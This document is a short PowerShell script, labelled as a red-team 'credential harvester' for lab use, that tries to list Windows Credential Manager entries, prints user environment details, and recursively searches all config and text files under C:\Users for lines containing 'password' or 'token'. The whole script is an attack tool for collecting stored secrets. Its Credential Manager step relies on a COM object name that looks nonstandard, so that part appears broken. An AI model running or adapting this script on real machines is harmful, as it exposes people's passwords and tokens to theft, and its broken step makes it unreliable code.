# Red Team Tool – Credential Harvester (PowerShell)
# Lab use ONLY

Write-Host "`n🕵️ Gathering stored credentials..."

# 1. Get credentials from Windows Credential Manager
try {
    $vaults = New-Object -ComObject "CredentialManager.CredentialVault"
    $vaults.GetCredentials() | ForEach-Object {
        Write-Host "💾 Found: $($_.TargetName) – $($_.UserName)"
    }
} catch {
    Write-Host "❌ COM object for Credential Manager not available. Skipping..."
}

# 2. Check for saved credentials in env vars
Write-Host "`n📂 Environment Variables:"
$envVars = @("USERNAME", "USERDOMAIN", "COMPUTERNAME", "USERPROFILE", "HOMEPATH", "APPDATA")
foreach ($var in $envVars) {
    Write-Host "$var = $($env:$var)"
}

# 3. Optional: Look for common plaintext creds in files
Write-Host "`n🔍 Searching for 'password' and 'token' in config files..."
Get-ChildItem -Path C:\Users -Include *.xml,*.config,*.ini,*.txt -Recurse -ErrorAction SilentlyContinue |
    Select-String -Pattern "password|token" |
    Select-Object Path, Line | Format-Table -AutoSize

Write-Host "`n✅ Harvest complete. Use responsibly."
